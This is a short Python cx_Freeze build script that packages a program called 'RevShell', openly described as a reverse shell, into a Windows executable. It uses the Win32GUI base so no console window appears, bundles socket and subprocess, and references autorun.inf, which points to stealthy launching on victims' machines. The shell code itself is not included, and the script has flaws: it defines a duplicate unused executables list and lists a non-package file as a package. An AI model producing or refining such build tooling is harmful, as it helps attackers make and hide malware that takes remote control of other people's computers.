import sys
from cx_Freeze import setup, Executable

base = None    

if sys.platform == "win32":
    base = "Win32GUI"

executables = [Executable("myfirstprog.py", base=base)]

packages = ["idna", "os", "socket", "subprocess", "platform", "autorun.inf"]
options = {
    'build_exe': {    
        'packages':packages,
    },    
}

setup(
    name = "RevShell",
    options = options,
    version = "0.9",
    description = 'A reverse shell application',
    executables = [Executable("client.py", base = base)]
)
